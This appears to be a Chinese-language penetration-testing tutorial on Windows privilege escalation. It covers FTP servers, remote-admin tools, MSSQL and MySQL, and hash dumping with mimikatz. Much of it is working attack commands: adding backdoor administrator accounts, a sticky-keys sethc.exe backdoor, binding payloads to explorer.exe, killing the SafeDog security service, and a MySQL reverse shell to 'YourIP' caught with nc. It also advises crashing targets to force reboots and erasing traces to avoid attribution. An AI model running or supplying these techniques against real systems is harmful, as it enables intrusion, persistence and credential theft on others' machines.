+<blockquote>
+<p><strong>server-u 提权：</strong></p>
+<ul>
+<li>
+<p>有修改权限：</p>
+<ul>
+<li>检查是否有可写权限修改server-u默认安装目录下的ServUDaemon.ini</li>
+<li>增加用户</li>
+<li>连接</li>
+<li>执行命令</li>
+</ul>
+<p><code>quote site exec net user cracer cracer.com /add</code></p>
+<p><code>quote site exec net localgroup administrators cracer /add</code></p>
+</li>
+<li>
+<p>无修改权限：</p>
+<p>暴力破解 md5</p>
+<p>溢出提权</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="g6ftp-提权"><a class="markdownIt-Anchor" href="#g6ftp-提权"></a> G6ftp 提权</h3>
+<ul>
+<li>
+<p>下载管理配置文件，将 administrator 管理密码破解</p>
+</li>
+<li>
+<p>使用 lcx 端口转发（默认只允许本机连接）</p>
+<p><img lazyload alt="image" data-src="image-20250124185431424.png"></p>
+<p>可以看到他只允许在本机的 <code>127.0.0.1</code>上面使用服务端软件登录（08虚拟机 <strong>192.168.0.200</strong>）</p>
+<p><code>lcx.exe -tran 8222 127.0.0.1 8021</code></p>
+<p><img lazyload alt="image" data-src="image-20250124185150304.png"></p>
+<p>然后我们在 Windows7（<strong>192.168.0.117</strong>）上面也下载一个服务端软件，同时新建一个连接，将端口修改为转发后的8222</p>
+<p><img lazyload alt="image" data-src="image-20250124185922793.png"></p>
+<p>转发之后我们尝试连接，可以看到已经成功连接了（这一步链接是需要账号以及密码的）</p>
+<p><img lazyload alt="image" data-src="image-20250124192922109.png"></p>
+<p>然后我们创建一个新用户，将权限选为 All</p>
+<p><img lazyload alt="image" data-src="image-20250124193244994.png"><br>
+<img lazyload alt="image" data-src="image-20250124193334740.png"></p>
+<p>然后我们新建一个站点命令，执行一个批处理文件，将下列命令放到批处理文件里面：</p>
+<p><code>net user x 123.com /add</code> <code>net localgroup administrators x /add</code> 保存为 <code>x.bat</code></p>
+<p><img lazyload alt="image" data-src="image-20250124193427803.png"></p>
+<p>然后我们将这个批处理文件上传上去，然后直接执行刚刚设置的站点命令：<code>quote site useradd</code></p>
+<p><img lazyload alt="image" data-src="image-20250124193737022.png"></p>
+<p>这么一来，这个 x 用户就被加入到管理员组了，提权成功</p>
+</li>
+</ul>
+<h3 id="filezilla-提权"><a class="markdownIt-Anchor" href="#filezilla-提权"></a> filezilla 提权</h3>
+<ul>
+<li>filezilla 是一款开源的 FTP 服务器和客户端的软件。</li>
+<li>若安装了服务器端默认只侦听 127.0.0.1 的 14147 端口</li>
+<li>并且默认安装目录目录下有两个敏感文件 filezillaserver.xml（包含了用户信息）和 filezillaserver interface.xml（包含了管理信息）</li>
+<li>提权思路：
+<ul>
+<li>下载这个两个文件，拿到管理密码</li>
+<li>配置端口转发，登录远程管理 ftpserve，创建 ftp 用户</li>
+<li>分配权限，设置家目录为C:\</li>
+<li>使用 cmd.exe 改名为 sethc.exe 替换 c:\windows\system32\sethc.exe 生成 shift 后门</li>
+</ul>
+</li>
+<li>连接3389按5次 shift 调出 cmd.exe</li>
+</ul>
+<p>依旧是在拿到 shell 之后寻找密码，可以看到这个密码什么都没写，说明就没有密码</p>
+<p><img lazyload alt="image" data-src="image-20250124194452917.png"></p>
+<p>密码不需要填写，然后连接到通过端口转发的 14148 端口</p>
+<p><img lazyload alt="image" data-src="image-20250124194704753.png"></p>
+<p>然后我们转发端口之后进行连接，可以看到连接成功了</p>
+<p><img lazyload alt="image" data-src="image-20250124194803454.png"><br>
+<img lazyload alt="image" data-src="image-20250124194846865.png"></p>
+<p>登录进来之后就可以创建一个新的用户，创建完之后添加一个新密码，然后设置共享文件夹，将整个 C 盘设置为共享文件夹，同时将权限全部设置上（服务端）</p>
+<p><img lazyload alt="image" data-src="image-20250124195016631.png"><br>
+<img lazyload alt="image" data-src="image-20250124195052486.png"><br>
+<img lazyload alt="image" data-src="image-20250124195145158.png"></p>
+<p>然后是客户端，我们直接连接登录上去</p>
+<p><img lazyload alt="image" data-src="image-20250124195345858.png"></p>
+<p>然后我们将一个<code>cmd.exe</code> 改名为 <code>sethc.exe</code>，然后将原本的这个程序替换，这个程序其实就是粘滞键，然后我们替换之后，就可以通过连续点击 5 次 shift 将终端打开</p>
+<p><img lazyload alt="image" data-src="image-20250124195525354.png"></p>
+<p>假如说目标开启了 3389，我们就可以远程连接目标，然后连续点击 5 次 shift，可以看到终端出来了</p>
+<p><img lazyload alt="image" data-src="image-20250124195914959.png"></p>
+<p>然后我们执行命令：<code>taskmgr</code> 可以调用任务管理器，<code>explorer.exe</code> 可以直接呼出桌面，都不需要登录了</p>
+<p><img lazyload alt="image" data-src="image-20250124200010819.png"></p>
+<p>但是这个只适用于03，切换为08就无法成功了，这个时候就可以使用另外一种方法，我们可以使用 MSF 或者 CS 生成一个 payload，然后将其与 cmd 捆绑替换，这么一来，只要管理员调用 cmd，那么 payload 就会执行，那假如管理员不用 cmd 呢？这个简单，只要是系统加载界面就需要调用 <code>explorer.exe</code>，那我们直接将这个程序和 payload 捆绑就可以<br>
+说了这么多，其实只要是系统必须要调用的文件都可以进行捆绑，就比如一些 dll 文件，就可以进行 dll 劫持提权</p>
+<h3 id="远程管理软件提权"><a class="markdownIt-Anchor" href="#远程管理软件提权"></a> 远程管理软件提权</h3>
+<p><img lazyload alt="image" data-src="image-20250124201014943.png"></p>
+<p>我们可以在目标上面的 <code>pcAnywhere</code> 管理端新添加一个被控端，然后添加一个新的被控端</p>
+<p><img lazyload alt="image" data-src="image-20250124201113249.png"></p>
+<p>在 <code>pcAnywhere</code> 的目录下面找到文件<code>PCA.admin.CIF</code> （中间那个admin是用户名），然后使用这个文件破解账号以及密码</p>
+<p><img lazyload alt="image" data-src="image-20250124201534352.png"><br>
+<img lazyload alt="image" data-src="image-20250124201736909.png"></p>
+<p>因为 Windows7 安装不了，所以我们就直接自己链接自己吧，主控端添加自己的 IP，然后输入账密就可以连接</p>
+<p><img lazyload alt="image" data-src="image-20250124201949412.png"><br>
+<img lazyload alt="image" data-src="image-20250124202043998.png"></p>
+<h3 id="radmin-提权"><a class="markdownIt-Anchor" href="#radmin-提权"></a> radmin 提权</h3>
+<p>通过端口扫描扫描 4899 端口，上传 radmin.asp 木马读取 radmin 的加密密文，最后使用工具连接（注意将密文转为小写）</p>
+<p><img lazyload alt="image" data-src="image-20250124203606545.png"><br>
+<img lazyload alt="image" data-src="image-20250124203627447.png"></p>
+<h3 id="vnc-提权"><a class="markdownIt-Anchor" href="#vnc-提权"></a> vnc 提权</h3>
+<p>通过读取注册表十进制数，然后转换成十六进制数</p>
+<p><img lazyload alt="image" data-src="image-20250124203903274.png"></p>
+<p>破解十六进制数得到密码，<code>vncx4.exe -W</code> 然后输入转换后的十六进制数，就可以得到密码，最后下载一个客户端直接连接 vnc</p>
+<p><img lazyload alt="image" data-src="image-20250124204017922.png"></p>
+<blockquote>
+<p>拥有高权限的 web 容器及中间件：</p>
+<ul>
+<li>winmail server</li>
+<li>phpstudy</li>
+<li>wamp</li>
+<li>upupw</li>
+<li>tomcat</li>
+<li>Strus2</li>
+<li>java反序列漏洞</li>
+</ul>
+<p>我们可以尝试劫持这些高权限的容器，然后往容器里面写木马</p>
+</blockquote>
+<h2 id="数据库提权"><a class="markdownIt-Anchor" href="#数据库提权"></a> 数据库提权</h2>
+<p>sqlserver 数据库提权、MySQL 数据库提权，需要具备数据库管理员权限才可执行提权操作</p>
+<blockquote>
+<p>前提条件：</p>
+<ol>
+<li>
+<p>拥有数据库管理员账号密码权限</p>
+</li>
+<li>
+<p>Windows系统下（没有被降权）</p>
+<p>zkeys下面的 mysql 的权限就被降权为服务用户权限，还有就是宝塔，也可能会被降权</p>
+<p>Linux 下 mysql 的 root 权限是服务用户权限，很小，不能提权</p>
+</li>
+</ol>
+</blockquote>
+<h3 id="mssql-提权"><a class="markdownIt-Anchor" href="#mssql-提权"></a> mssql 提权</h3>
+<blockquote>
+<p>sqlserver 的 sa 账号获取方法：</p>
+<ol>
+<li>爆破</li>
+<li>查找网站源码数据库链接文件（<code>web.config</code> <code>conn.asp/aspx</code> <code>config.asp/aspx</code> <code>dbconfig.asp/aspx</code>）</li>
+</ol>
+<p>如果我们拿到的账号为：xycms（不是 sa，但是这不代表不是 sa 权限），如果有注入的话，我们就可以使用 sqlmap执行命令：<code>sqlmap --is-dba</code> 如果是 <code>true</code>，说明就是 sa 权限（系统权限），如果没有注入，我们就可以对四大类数据库进行一系列数据库操作，如果可以执行成功就说明是 sa 权限（<strong>用户名就是 sa</strong>）</p>
+<p>一般情况下，sa 登录是允许外部地址登录的，但是 mysql 的 root 账号默认是不允许外部地址登录的</p>
+</blockquote>
+<p>mssql 提权方法：安装组件、开启3389、创建用户、提升权限、sa 账号的获取，去查看 config.asp,conn.asp 等文件。</p>
+<p>假设我们现在已经获取到了mssql 的账号以及密码，然后在它允许外连的前提下，我们可以尝试使用 <code>sql TOOLS</code>工具进行连接：</p>
+<p><img lazyload alt="image" data-src="image-20250125115950454.png"></p>
+<p>可以看到连接成功了，然后我们尝试执行命令，但是可以看到，<code>xp_cmdshell</code> 组件被禁用了，这个时候我们就可以使用 MSSQL查询分析器进行连接尝试，但是这个工具只能在 Windows7 使用</p>
+<p><img lazyload alt="image" data-src="image-20250125120049563.png"><br>
+<img lazyload alt="image" data-src="image-20250125120301853.png"></p>
+<p>然后我们执行命令，将组件启用</p>
+<p><img lazyload alt="image" data-src="image-20250125120402205.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装cmd_shell组件</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"># 删除cmd_shell组件</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+<p><img lazyload alt="image" data-src="image-20250125120650117.png"></p>
+<p>组件开启成功之后我们再次返回去执行系统命令，可以看到命令执行成功，然后我们就可以使用命令创建一个账户，同时加入到管理员组，之后再使用命令给目标开启 3389端口，然后直接使用 <code>mstsc</code> 连接目标</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启3389</span></span><br><span class="line"><span class="built_in">exec</span> master.dbo.xp_regwrite<span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,<span class="string">&#x27;fDenyTSConnections&#x27;</span>,<span class="string">&#x27;REG_DWORD&#x27;</span>,0;--</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭3389</span></span><br><span class="line"><span class="built_in">exec</span> master.dbo.xp_regwrite<span class="string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,<span class="string">&#x27;fDenyTSConnections&#x27;</span>,<span class="string">&#x27;REG_DWORD&#x27;</span>,1;--</span><br></pre></td></tr></table></figure>
+<p><img lazyload alt="image" data-src="image-20250125121339778.png"></p>
+<p>当我们测试完之后，需要将之前开启的组件以及端口全部关闭掉，防止被人发现然后溯源</p>
+<h3 id="绕过安全狗提权"><a class="markdownIt-Anchor" href="#绕过安全狗提权"></a> 绕过安全狗提权</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># system权限的情况下：</span></span><br><span class="line">net stop <span class="string">&quot;safedog guard center&quot;</span> /y</span><br><span class="line">net stop <span class="string">&quot;safedog update center&quot;</span> /y</span><br><span class="line">net stop <span class="string">&quot;safedogguardcenter&quot;</span> /y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除安全狗服务(关闭开机自启动)：</span></span><br><span class="line">sc stop <span class="string">&quot;SafeDogGuardCenter&quot;</span></span><br><span class="line">sc config <span class="string">&quot;SafeDogGuardCenter&quot;</span> start=disabled</span><br><span class="line">sc delete <span class="string">&quot;Safedogguardcenter&quot;</span></span><br><span class="line"></span><br><span class="line">sc stop <span class="string">&quot;SafeDogupdateCenter&quot;</span></span><br><span class="line">sc config <span class="string">&quot;SafeDogUpdateCenter&quot;</span> start=disabled</span><br><span class="line">sc delete <span class="string">&quot;SafedogUpdatecenter&quot;</span></span><br><span class="line"></span><br><span class="line">sc stop <span class="string">&quot;SafeDogCloudHeler&quot;</span></span><br><span class="line">sc config <span class="string">&quot;SafeDogCloudHeler&quot;</span> start=disabled</span><br><span class="line">sc delete <span class="string">&quot;SafeDogCloudHeler&quot;</span></span><br></pre></td></tr></table></figure>
+<p>我们要清楚一点就是，安全狗他不会拦截你创建账号，但是他会拦截你将账号加入到管理员组，所以我们可以尝试加入到其他的组里面，就比如下面的远程桌面组，但是加入这个组之后，我们进行登录还是普通用户，就比如说 C 盘的一些敏感目录我们还是无法进行访问，这个时候我们就需要对文件进行降权：<code>cacls C: /e /t /g everyone:F</code>（ <strong>这个命令的作用是递归地修改C盘根目录及其所有子目录和文件的权限，授予“Everyone”用户组完全控制权限，而不删除现有的权限设置</strong> ）这样就可以访问了</p>
+<p><img lazyload alt="image" data-src="image-20250125122120691.png"><br>
+<img lazyload alt="image" data-src="image-20250125122327224.png"></p>
+<p>如果说 SqlServer 不允许外连，那我们就可以上传一些大马进行连接，然后执行命令开启组件，开启组件之后就可以尝试执行命令了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1433 SQL入侵恢复 xp_cmdshell 方法总结:</span></span><br><span class="line"><span class="comment"># sql server 2005下开启xp_cmdshell的方法</span></span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;RECONFIGURE;EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,1;RECONFIGURE;</span><br><span class="line"><span class="comment"># 关闭，下面的同理，将1改为0</span></span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;RECONFIGURE;EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,0;RECONFIGURE;</span><br><span class="line"></span><br><span class="line"><span class="comment"># SQL2005开启&#x27;OPENROWSET&#x27;支持的方法:</span></span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;RECONFIGURE;<span class="built_in">exec</span> sp_configure <span class="string">&#x27;Ad Hoc DistributedQueries&#x27;</span>, 1;RECONFIGURE;</span><br><span class="line"></span><br><span class="line"><span class="comment"># SQL2005开启&#x27;sp_oacreate&#x27;支持的方法:</span></span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1;RECONFIGURE;<span class="built_in">exec</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>, 1;RECONFIGURE;</span><br></pre></td></tr></table></figure>
+<h3 id="mysql-提权"><a class="markdownIt-Anchor" href="#mysql-提权"></a> mysql 提权</h3>
+<blockquote>
+<ol>
+<li>UDF 提权</li>
+<li>启动项提权</li>
+<li>MOF 提权</li>
+<li>反链端口提权</li>
+</ol>
+</blockquote>
+<h4 id="udf-提权"><a class="markdownIt-Anchor" href="#udf-提权"></a> udf 提权</h4>
+<blockquote>
+<p>获取到对方的 mysql 数据库下的 root 账号密码</p>
+<ol>
+<li>
+<p>查看网站源码里面数据库配置文件（inc，conn，config.sql，common，data等）</p>
+</li>
+<li>
+<p>查看数据库安装路径下的 user.myd（/data/mysql/）下载，本地替换</p>
+<p><code>mysqld --skip-grant-tables</code> 跳过验证</p>
+<p><code>mysql.exe -uroot</code> 进入MySQL</p>
+</li>
+<li>
+<p>暴力破解 mysql 密码破解 3306 端口入侵</p>
+</li>
+</ol>
+<p>udf 提权原理：通过 root 权限导出 udf.dll 到系统目录下，可以通过 udf.dll 调用执行 cmd</p>
+</blockquote>
+<blockquote>
+<p><strong>mysql 提权：</strong></p>
+<ol>
+<li>
+<p>root 账号的获取：</p>
+<p>可以通过网站源码获取 (<code>conn.php</code> <code>config.php</code>/ <code>dbconfig.php</code> <code>db.php</code> <code>config.inc.php</code> <code>common.inc.php</code>)，但是大概率通过这种方法只能获取到一个普通用户的账号<br>
+假如说我们获取到的是一个以网站命名的账号：xycms，那么这个时候我们就需要分析网站的属性了：</p>
+<ol>
+<li>假如说我们拿到的是阿里云的虚拟机，里面有300多个站点，那这里面的数据库账号一般都是普通权限，因为虚拟主机会根据不同的站点创建不同的数据库用户来连接数据库</li>
+<li>如果站点是企业自己的服务器，站点不多，那么大概率每一个站点连接的数据库都是管理员的（单个服务器单个站点或者一个企业属性的站点群）<strong>这种站点一般防护都很一般</strong></li>
+</ol>
+<p>我们得到的账号不是 root 并不代表它就不是 root 权限，可以链接查看，如果能对 mysql数据库进行操纵一般就是管理员</p>
+</li>
+<li>
+<p>爆破（默认不能通过外部地址爆破 root）</p>
+<p>只能爆破127 或者 localhost，这个时候就可以考虑去上传一些大马，也可以上传完木马之后，抓包然后爆破密码：</p>
+<p><img lazyload alt="image" data-src="image-20250125163200377.png"></p>
+<p>如果我们可以通过 webshell 连接的话，我们可以进入到 mysql 数据库的 user 表中查看管理员用户的账密，那么这个时候问题来了，假如说这些 user 表文件数据显示不完全怎么办？这个时候就可以来到本地的数据库，然后将目标的三个文件下载到本地，并且将本地的数据库中的 user 表文件替换</p>
+<p><img lazyload alt="image" data-src="image-20250125163930284.png"></p>
+<p>这个时候我们本地的数据库账号以及密码已经修改为了目标的，那我们应该如何登录呢？可以直接使用命令：<code>mysqld --skip-grant-tables</code> ，这个命令可以让我们直接跳过密码验证，这个时候我们就不需要密码直接回车就可以登录</p>
+<p><img lazyload alt="image" data-src="image-20250125164042583.png"><br>
+<img lazyload alt="image" data-src="image-20250125164258915.png"><img lazyload alt="image" data-src="image-20250125164153621.png"></p>
+<p>进入之后直接：<code>use mysql</code> <code>select * from user</code></p>
+</li>
+</ol>
+</blockquote>
+<p>UDF 提权，首先，我们可以将脚本上传到目标，然后进行访问，可以看到它先是确定是否存在 plugin 目录，如果不存在的话，我们可以直接点击旁边的 <code>Create PluginDir</code>来创建这个目录</p>
+<p><img lazyload alt="image" data-src="image-20250125165602170.png"></p>
+<p>创建成功之后就可以导入<code>udf.dll</code>，这个文件就在我们的脚本里面，然后创建函数，之后我们就可以通过这个创建的函数执行命令了</p>
+<p><img lazyload alt="image" data-src="image-20250125165922967.png"><br>
+<img lazyload alt="image" data-src="image-20250125165948449.png"><br>
+<img lazyload alt="image" data-src="image-20250125170019679.png"></p>
+<p><img lazyload alt="image" data-src="image-20250125170456531.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># udf提权</span></span><br><span class="line">C:\Winnt\udf.dll 2000</span><br><span class="line">C:\Windows\udf.dll 2003</span><br><span class="line">现在基本上 win 的服务器就这两个导出 UDF.DLL</span><br><span class="line">5.1以上版本需要导出到 mysql 安装目录lib\plugin\</span><br><span class="line">create <span class="keyword">function</span> cmdshell returns string soname <span class="string">&#x27;udf.dll&#x27;</span></span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net user cracker cracker /add&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> cmdshell(<span class="string">&#x27;net localgroup administrators cracker /add&#x27;</span>);</span><br><span class="line">drop <span class="keyword">function</span> cmdshell;删除函数</span><br></pre></td></tr></table></figure>
+<h3 id="启动项提权"><a class="markdownIt-Anchor" href="#启动项提权"></a> 启动项提权</h3>
+<ol>
+<li>
+<p>查看我们进入数据库中有些什么数据表</p>
+<p><code>show tables;</code> 默认的情况下，test 中没有任何表的存在。</p>
+</li>
+<li>
+<p>在 TEST 数据库下创建一个新的表；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table a (cmd text);</span><br></pre></td></tr></table></figure>
+<p>好了，我们创建了一个新的表，表名为a，表中只存放一个字段，字段名为 cmd，为 text 文本。</p>
+</li>
+<li>
+<p>在表中插入内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into a values (&quot;set wishshell=createobject (&quot;&quot;wscript.shell&quot;&quot;)&quot;);</span><br><span class="line">insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user 1 1 /add&quot;&quot;,0)&quot;);</span><br><span class="line">insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup Administrators 1 /add&quot;&quot;,0)&quot;);</span><br></pre></td></tr></table></figure>
+<p>注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个 VBS 的脚本程序！</p>
+</li>
+<li>
+<p>现在我们来看看表 a 中有些什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from a;</span><br></pre></td></tr></table></figure>
+<p>我们将会看到表中有三行数据，就是我们刚刚输入的内容，确认你输入的内容无误后，我们来到下一步</p>
+</li>
+<li>
+<p>输出表为一个VBS的脚本文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这一步是将这个脚本文件加入到启动项里面</span><br><span class="line">select * from a into outfile &quot;c://docume~1//administrator//「开始」菜单//程序//启动 //a.vbs;&quot;;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>重启即可！</p>
+</li>
+</ol>
+<p>目标的电脑一旦重启就会创建一个系统管理员的账号，那么问题来了，假如他不重启怎么办呢？这个时候就可以使用MSF上面的<code>ms12-020</code>，可以让目标蓝屏，只要蓝屏他一定会重启</p>
+<h3 id="mof-提权"><a class="markdownIt-Anchor" href="#mof-提权"></a> mof 提权</h3>
+<ol>
+<li>
+<p>第一种方法：</p>
+<ul>
+<li>上传 <code>mof.php</code></li>
+<li>输入相关信息，执行命令，提权。</li>
+</ul>
+</li>
+<li>
+<p>第二种方法：</p>
+<ul>
+<li>
+<p>上传文件 <code>x.mof</code></p>
+</li>
+<li>
+<p>使用 select 命令导出到正确位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load file(&#x27;C:/wmpub/nullevt.mof&#x27;) into dumplile &#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>允许外部地址使用 root 用户连接的 sql 语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Grant all privileges on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;root&#x27; with grant option;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="反链端口提权"><a class="markdownIt-Anchor" href="#反链端口提权"></a> 反链端口提权</h3>
+<p>利用 mysql 客户端工具连接 mysql 服务器，然后执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql.exe -h 172.16.10.11 -uroot -p</span><br><span class="line">Enter password:</span><br><span class="line">mysql&gt; \. c:\mysql.txt</span><br><span class="line">mysql&gt;select backshell(&quot;YourIP&quot;,2010);</span><br></pre></td></tr></table></figure>
+<p>本地监听你反弹的端口：<code>nc.exe -vv -l -p 2010</code> ，成功后你将获得一个 system权限的 <code>cmdshell</code>，其实这个也是利用的UDF提权</p>
+<h2 id="hash获取与破解"><a class="markdownIt-Anchor" href="#hash获取与破解"></a> HASH获取与破解</h2>
+<p>需要管理员权限方可执行读取hash操作：<code>gethashes.exe $local</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gsecdump</span><br><span class="line">-h 显示帮助</span><br><span class="line">-a 获取所有密码信息</span><br><span class="line">-s 从sam文件和域控中获取hash值</span><br><span class="line">-U 获取当前登录用户的hash</span><br><span class="line">-w 获取无线密码</span><br></pre></td></tr></table></figure>
+<p>也可以使用 pwdump7.exe 获取 hash</p>
+<h3 id="mimikatz-使用"><a class="markdownIt-Anchor" href="#mimikatz-使用"></a> mimikatz 使用</h3>
+<ul>
+<li>
+<p><strong>mimikatz 使用时需要高权限，至少是 administrator 权限</strong></p>
+</li>
+<li>
+<p><strong>mimikatz 抓取密码的命令需要 system 权限，可以先进行提权</strong></p>
+<ul>
+<li><code>privilege::debug</code>  # 提升权限（从 administrator 提升到 system）</li>
+</ul>
+</li>
+<li>
+<p>抓取 hash</p>
+<ul>
+<li><code>sekurlsa::logonpasswords</code>  # 获取当前在线用户的明文密码（需要高权限运行）</li>
+<li><code>lsadump::isa /patch</code>  # 获取当前此计算机存在过用户的NTLMHASH</li>
+</ul>
+</li>
+<li>
+<p><strong>mimikatz的其他命令</strong></p>
+<ul>
+<li><code>lsadump::sam SYSTEM.hiv</code>  # 导出所有用户口令 使用 Value Shadow Copy 获得 SYSTEM、SAM 备份</li>
+</ul>
+</li>
+<li>
+<p>通过内存文件获取口令</p>
+<ul>
+<li><code>sekurlsa::minidump lsass.dmp</code></li>
+<li><code>sekurlsa::logonPasswords full</code></li>
+<li>拉取 <a class="link" target="_blank" rel="noopener" href="http://rd.adsecurity.org">rd.adsecurity.org<i class="fas fa-external-link-alt"></i></a> 域中的 KRBTGT 用户帐户的密码数据</li>
+<li><code>lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt</code></li>
+<li>拉取 <a class="link" target="_blank" rel="noopener" href="http://lab.adsecurity.org">lab.adsecurity.org<i class="fas fa-external-link-alt"></i></a> 域中 ADSDCO3 域控制器的计算机帐户的密码数据</li>
+<li><code>lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="hash-破解工具"><a class="markdownIt-Anchor" href="#hash-破解工具"></a> hash 破解工具</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">saminside</span><br><span class="line">oclhasheat</span><br><span class="line">LC5</span><br><span class="line">Ophcrack</span><br><span class="line">john the Ripper</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用与提权"><a class="markdownIt-Anchor" href="#漏洞利用与提权"></a> 漏洞利用与提权</h2>
+<h3 id="补丁提取"><a class="markdownIt-Anchor" href="#补丁提取"></a> 补丁提取</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用补丁提取脚本</span></span><br><span class="line">wmic qfe get Caption, description, hotfixid, installedon</span><br><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
+<h3 id="windows-exploit-suggester"><a class="markdownIt-Anchor" href="#windows-exploit-suggester"></a> windows-exploit-suggester</h3>
+<p>用来查看哪些补丁漏洞是可以使用的，使用方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows-exploit-suggester.py --update</span><br></pre></td></tr></table></figure>
+<p>将服务器执行 <code>systeminfo &gt; a.txt</code></p>
